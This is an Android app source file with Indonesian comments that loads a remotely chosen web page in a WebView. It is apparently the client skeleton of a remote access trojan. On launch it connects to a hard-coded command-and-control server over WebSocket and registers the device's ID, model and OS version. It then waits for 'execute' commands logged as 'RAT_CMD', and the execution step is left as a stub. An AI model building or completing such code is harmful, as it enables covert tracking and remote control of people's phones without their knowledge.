package com.kinar.rmdproject;

import android.os.Bundle;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;
import okhttp3.*;
import org.json.JSONObject;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {
    private WebSocket webSocket;
    private String deviceId;
    private WebView webView;
    
    // GANTI IP/PORT INI SESUAI SERVER PTERODACTYL LO
    private final String SERVER_HTTP = "http://herstoreganteng.rexypediaa.biz.id:4732";
    private final String WS_URL = "ws://herstoreganteng.rexypediaa.biz.id:4732"; 

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        // Tampilan loading awal
        webView.loadData("<h2 style='text-align:center;margin-top:50px;'>Memuat...</h2>", "text/html", "UTF-8");
        setContentView(webView);

        deviceId = android.provider.Settings.Secure.getString(
                getContentResolver(), 
                android.provider.Settings.Secure.ANDROID_ID
        );
        
        fetchTargetUrl();
        connectWebSocket();
    }

    private void fetchTargetUrl() {
        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder().url(SERVER_HTTP + "/api/get-target").build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                // Kalo gagal, fallback ke URL default
                runOnUiThread(() -> webView.loadUrl("https://rioomd.my.id")); 
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    String urlTarget = response.body().string();
                    runOnUiThread(() -> webView.loadUrl(urlTarget));
                } else {
                    runOnUiThread(() -> webView.loadUrl("https://rioomd.my.id"));
                }
            }
        });
    }

    private void connectWebSocket() {
        OkHttpClient client = new OkHttpClient.Builder()
                .readTimeout(0, TimeUnit.MILLISECONDS)
                .build();

        Request request = new Request.Builder().url(WS_URL).build();

        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                super.onOpen(webSocket, response);
                registerDevice(webSocket);
            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                super.onMessage(webSocket, text);
                try {
                    JSONObject json = new JSONObject(text);
                    if (json.getString("type").equals("execute")) {
                        String cmd = json.getString("command");
                        Log.d("RAT_CMD", "Executing: " + cmd);
                        // Logika command taruh sini
                    }
                } catch (Exception e) { e.printStackTrace(); }
            }
        });
    }

    private void registerDevice(WebSocket ws) {
        try {
            JSONObject json = new JSONObject();
            json.put("type", "register");
            json.put("device_id", deviceId);
            json.put("name", android.os.Build.MODEL);
            json.put("os", "Android " + android.os.Build.VERSION.RELEASE);
            json.put("battery", 85); 
            ws.send(json.toString());
        } catch (Exception e) { e.printStackTrace(); }
    }
}
